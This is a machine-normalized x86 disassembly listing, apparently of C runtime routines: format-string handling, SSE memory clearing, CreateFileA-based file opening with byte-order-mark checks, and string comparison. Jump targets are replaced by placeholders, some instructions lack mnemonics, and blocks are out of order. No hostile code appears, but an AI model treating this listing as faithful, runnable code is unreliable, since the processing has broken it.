and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x21c ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x258 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x25c ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x25c ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x224 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_424869
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
test [ ebp - 0x210 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x230 ]
mov edi [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0x22c ]
call sub_429015
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
push ebx
push 0x20
call sub_434b42
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov [ ebp - 0x278 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x224 ] edi
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push ebx
push eax
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
call sub_434970
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_434af2
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x228 ]
call sub_429015
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x228 ]
call sub_434b42
add esp 0xc
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_428905
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
push 0x8
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x228 ]
mov [ esi ] eax
mov ax [ ebp - 0x228 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x21c ] ebx
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_434690
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x228 ]
call sub_434b42
add esp 0xc
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x270 ] eax
je r-xdata
pop esi
call sub_4258f0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x25c ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
cmp [ ebp - 0x228 ] 0x0
jl r-xdata
push [ ebp - 0x270 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0xc ]
call sub_429015
cmp [ ebp - 0x264 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x264 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
inc esi
push eax
inc esi
call sub_434af2
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_435756
push 0x10
push r--data
call sub_42b398
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
sub_4357b6
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_43580d
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_43580d
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_4357b6
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_43589c
push 0x10
push r--data
call sub_42b398
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_435932
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_42462f
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_424869
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_43593c
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_438740
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_425ec4
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_425eb1
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_43688c
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_425ec4
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_425eb1
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_425eb1
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_425ed7
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_425ed7
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_425eb1
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_436647
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_42d253
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_42be4e
add esp 0xc
test eax eax
jne r-xdata
call sub_425ec4
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_42d253
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_42de98
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_425ed7
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_4366c8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_4384ce
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_42be4e
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_434725
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_434725
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_42de98
pop ecx
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_42d253
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_42cfe4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_42d253
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_434725
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_434725
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_43605b
push 0x14
push r--data
call sub_42b398
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_425eb1
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_423d36
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_42b3dd
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_43593c
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4360f9
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_4360f9
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_436865
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_436127
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_43605b
add esp 0x18
pop ebp
retn
sub_436147
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_423619
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_423792
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
